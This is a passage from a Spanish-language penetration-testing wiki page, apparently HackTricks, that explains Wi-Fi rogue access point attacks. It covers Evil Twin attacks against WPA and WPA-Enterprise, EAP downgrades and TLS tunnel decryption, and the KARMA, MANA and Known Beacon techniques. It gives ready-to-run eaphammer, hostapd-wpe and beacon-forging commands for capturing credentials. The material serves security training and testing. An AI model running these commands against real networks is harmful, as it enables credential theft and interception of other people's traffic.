![](<../../images/image (1088).png>)

Por favor, ten en cuenta que por defecto, si un ESSID en el PNL está guardado como protegido por WPA, el dispositivo no se conectará automáticamente a un Open evil Twin. Puedes intentar DoS al AP real y esperar que el usuario se conecte manualmente a tu Open evil Twin, o puedes DoS al AP real y usar un WPA Evil Twin para capturar el handshake (usando este método no podrás permitir que la víctima se conecte a ti ya que no conoces el PSK, pero puedes capturar el handshake e intentar crackearlo).

_Algunos OS y AV advertirán al usuario de que conectarse a una red Open es peligroso..._

### WPA/WPA2 Evil Twin

Puedes crear un **Evil Twin usando WPA/2** y si los dispositivos están configurados para conectarse a ese SSID con WPA/2, intentarán conectarse. De todos modos, **para completar el 4-way-handshake** también necesitas **conocer** la **contraseña** que el cliente va a usar. Si **no la conoces**, la **conexión no se completará**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender este ataque, recomiendo leer primero la breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Using hostapd-wpe**

`hostapd-wpe` necesita un archivo de **configuración** para funcionar. Para **automatizar** la generación de estas configuraciones puedes usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (descarga el archivo python dentro de _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
En el archivo de configuración puedes seleccionar muchas cosas diferentes como ssid, canal, archivos de usuario, cret/key, parámetros dh, versión de wpa y auth...

[**Usando hostapd-wpe con EAP-TLS para permitir que cualquier certificado inicie sesión.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por defecto, EAPHammer emplea estos métodos de autenticación (observe GTC como el primero para intentar obtener plaintext passwords y luego el uso de métodos de autenticación más robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta es la metodología predeterminada para evitar tiempos de conexión largos. Sin embargo, también puedes especificar al servidor los métodos de autenticación de más débiles a más fuertes:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando Airgeddon**

`Airgeddon` puede usar certificados generados previamente para ofrecer autenticación EAP a redes WPA/WPA2-Enterprise. La red falsa degradará el protocolo de conexión a EAP-MD5 de modo que podrá **capturar al usuario y el MD5 de la contraseña**. Más tarde, el atacante puede intentar descifrar la contraseña.\
`Airggedon` te ofrece la posibilidad de un **Evil Twin attack continuo (ruidoso)** o **solo crear el Evil Attack hasta que alguien se conecte (suave).**

![](<../../images/image (936).png>)

### Depuración de túneles TLS PEAP y EAP-TTLS en ataques Evil Twins

_Este método fue probado en una conexión PEAP pero, como estoy descifrando un túnel TLS arbitrario, esto también debería funcionar con EAP-TTLS_

Dentro de la **configuración** de _hostapd-wpe_ **comenta** la línea que contiene _**dh_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` a `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Esto hará que `hostapd-wpe` **intercambie claves usando RSA** en lugar de DH, por lo que podrás **descifrar** el tráfico más tarde **conociendo la clave privada del servidor**.

Ahora inicia el **Evil Twin** usando **`hostapd-wpe`** con esa configuración modificada como de costumbre. Además, inicia **`wireshark`** en la **interfaz** que está realizando el ataque Evil Twin.

Ahora o más tarde (cuando ya hayas capturado algunos intentos de autenticación) puedes añadir la clave RSA privada a wireshark en: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Añade una nueva entrada y completa el formulario con estos valores: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**selecciona tu archivo de clave**, para evitar problemas selecciona un archivo de clave **sin protección por contraseña**).

![](<../../images/image (687).png>)

Y observa la nueva **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### Listas negras/blancas de ESSID y MAC

Diferentes tipos de Media Access Control Filter Lists (MFACLs) y sus modos correspondientes y efectos en el comportamiento de un rogue Access Point (AP):

1. **Lista blanca basada en MAC**:
- El rogue AP responderá solo a probe requests de los dispositivos especificados en la lista blanca, permaneciendo invisible para todos los demás que no estén listados.
2. **Lista negra basada en MAC**:
- El rogue AP ignorará las probe requests de los dispositivos en la lista negra, haciendo que el rogue AP sea invisible para esos dispositivos específicos.
3. **Lista blanca basada en SSID**:
- El rogue AP responderá a probe requests solo para ESSIDs específicos listados, haciéndose invisible para dispositivos cuyas Preferred Network Lists (PNLs) no contengan esos ESSIDs.
4. **Lista negra basada en SSID**:
- El rogue AP no responderá a probe requests para los ESSIDs específicos en la lista negra, haciéndose invisible para dispositivos que busquen esas redes concretas.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este método permite a un **atacante crear un access point (AP) malicioso que responde a todas las probe requests** de dispositivos que buscan conectarse a redes. Esta técnica **engaña a los dispositivos para que se conecten al AP del atacante** al imitar las redes que los dispositivos están buscando. Una vez que un dispositivo envía una solicitud de conexión a este rogue AP, completa la conexión, haciendo que el dispositivo se conecte por error a la red del atacante.

### MANA

Luego, **los dispositivos empezaron a ignorar respuestas de red no fiables**, reduciendo la efectividad del original karma attack. Sin embargo, se introdujo un nuevo método, conocido como el **MANA attack**, por Ian de Villiers y Dominic White. Este método implica que el rogue AP **capture las Preferred Network Lists (PNL) de los dispositivos respondiendo a sus broadcast probe requests** con nombres de red (SSID) previamente guardados por los dispositivos. Este ataque sofisticado elude las protecciones contra el original karma attack al explotar la forma en que los dispositivos recuerdan y priorizan las redes conocidas.

El MANA attack opera monitoreando tanto las directed como las broadcast probe requests de los dispositivos. Para las directed probe requests, registra la MAC address del dispositivo y el nombre de la red solicitada, añadiendo esta información a una lista. Cuando se recibe una broadcast probe request, el AP responde con información que coincide con cualquiera de las redes en la lista del dispositivo, incitando al dispositivo a conectarse al rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Un ataque **Loud MANA** es una estrategia avanzada para cuando los dispositivos no usan directed probing o cuando sus Preferred Network Lists (PNL) son desconocidas para el atacante. Se basa en el principio de que **los dispositivos en la misma área probablemente compartan algunos nombres de red en sus PNL**. En lugar de responder de forma selectiva, este ataque transmite probe responses para cada nombre de red (ESSID) encontrado en las PNL combinadas de todos los dispositivos observados. Este enfoque amplio aumenta la probabilidad de que un dispositivo reconozca una red familiar e intente conectarse al rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Cuando el **Loud MANA attack** no es suficiente, el **Known Beacon attack** presenta otro enfoque. Este método **brute-forces el proceso de conexión simulando un AP que responde a cualquier nombre de red, recorriendo una lista de ESSIDs potenciales** derivada de una wordlist. Esto simula la presencia de numerosas redes, con la esperanza de coincidir con un ESSID dentro del PNL de la víctima, lo que provoca un intento de conexión al AP falsificado. El ataque puede ampliarse combinándolo con la opción `--loud` para un intento más agresivo de atraer dispositivos.

Eaphammer implementó este ataque como un MANA attack donde todos los ESSIDs dentro de una lista se anuncian (también podrías combinar esto con `--loud` para crear un Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

El **Known Beacon Burst attack** implica la **emisión rápida en ráfagas de beacon frames para cada ESSID listado en un archivo**. Esto crea un entorno denso de redes falsas, aumentando considerablemente la probabilidad de que los dispositivos se conecten al rogue AP, especialmente cuando se combina con un MANA attack. Esta técnica aprovecha la velocidad y el volumen para saturar los mecanismos de selección de red de los dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** es un protocolo que permite a los dispositivos conectarse directamente entre sí usando Wi‑Fi sin necesidad de un access point inalámbrico tradicional. Esta capacidad está integrada en varios dispositivos Internet of Things (IoT), como impresoras y televisores, facilitando la comunicación directa dispositivo a dispositivo. Una característica notable de Wi‑Fi Direct es que un dispositivo asume el rol de access point, conocido como group owner, para gestionar la conexión.

La seguridad de las conexiones Wi‑Fi Direct se establece mediante **Wi-Fi Protected Setup (WPS)**, que admite varios métodos para el emparejamiento seguro, incluyendo:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Estos métodos, en particular PIN entry, son susceptibles a las mismas vulnerabilidades que WPS en redes Wi‑Fi tradicionales, por lo que son objetivos de vectores de ataque similares.

### EvilDirect Hijacking

**EvilDirect Hijacking** es un ataque específico de Wi‑Fi Direct. Reproduce el concepto de un ataque Evil Twin pero orientado a conexiones Wi‑Fi Direct. En este escenario, un atacante se hace pasar por un group owner legítimo con el objetivo de engañar a los dispositivos para que se conecten a una entidad maliciosa. Este método puede ejecutarse usando herramientas como `airbase-ng` especificando el canal, ESSID y la dirección MAC del dispositivo suplantado:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Echar un vistazo a [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
